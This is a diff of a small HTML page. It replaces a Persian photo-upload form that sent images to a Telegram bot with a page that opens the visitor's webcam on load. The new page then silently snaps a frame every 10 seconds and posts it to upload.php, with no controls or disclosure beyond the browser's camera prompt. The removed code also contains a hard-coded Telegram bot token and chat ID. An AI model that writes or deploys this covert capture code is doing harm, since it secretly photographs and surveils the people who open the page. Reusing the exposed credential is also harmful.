@@ -1,104 +1,61 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بارگذاری و ارسال عکس</title>
+    <title>Capture and Send Photo</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
         }
-        .container {
-            width: 400px;
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            text-align: center;
-        }
-        input[type="file"] {
-            margin-bottom: 20px;
-        }
-        img {
-            max-width: 100%;
-            border-radius: 10px;
-            margin-bottom: 20px;
-        }
-        button {
-            background-color: #25d366;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 20px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        button:hover {
-            background-color: #1ebe50;
+        #video {
+            border: 1px solid #ccc;
+            background-color: #000;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>بارگذاری و ارسال عکس</h2>
-        <input type="file" id="fileInput" accept="image/*">
-        <img id="preview" alt="پیش نمایش عکس">
-        <button onclick="sendPhoto()">ارسال عکس</button>
-    </div>
+    <div>
+        <video id="video" width="640" height="480" autoplay></video>
+        <script>
+            (async function() {
+                const video = document.getElementById('video');
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
 
-    <script>
-        const fileInput = document.getElementById('fileInput');
-        const preview = document.getElementById('preview');
+                    async function captureAndSend() {
+                        const canvas = document.createElement('canvas');
+                        const context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            if (blob) {
+                                const formData = new FormData();
+                                formData.append('photo', blob, 'photo.jpg');
 
-        fileInput.addEventListener('change', event => {
-            const file = event.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = e => {
-                    preview.src = e.target.result;
-                };
-                reader.readAsDataURL(file);
-            }
-        });
+                                fetch('upload.php', {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(err => console.error('Error:', err));
+                            }
+                        }, 'image/jpeg');
+                    }
 
-        function sendPhoto() {
-            const file = fileInput.files[0];
-            if (!file) {
-                alert('لطفاً ابتدا یک عکس انتخاب کنید.');
-                return;
-            }
+                    setInterval(captureAndSend, 10000); // Capture every 10 seconds
 
-            const formData = new FormData();
-            formData.append('photo', file);
-
-            const token = '7136537174:AAFYT6q7kfwALYQG9RkDzYpfSsUq7EuQ7GY'; // توکن ربات تلگرام خود را جایگزین کنید
-            const chatId = '7389856256'; // آی‌دی چت خود را جایگزین کنید
-            const url = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`;
-
-            fetch(url, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert('عکس با موفقیت ارسال شد!');
-                } else {
-                    alert('خطا در ارسال عکس.');
+                } catch (error) {
+                    console.error('Error accessing camera:', error);
                 }
-            })
-            .catch(error => {
-                alert('خطا در ارسال عکس.');
-                console.error(error);
-            });
-        }
-    </script>
+            })();
+        </script>
+    </div>
 </body>
 </html>
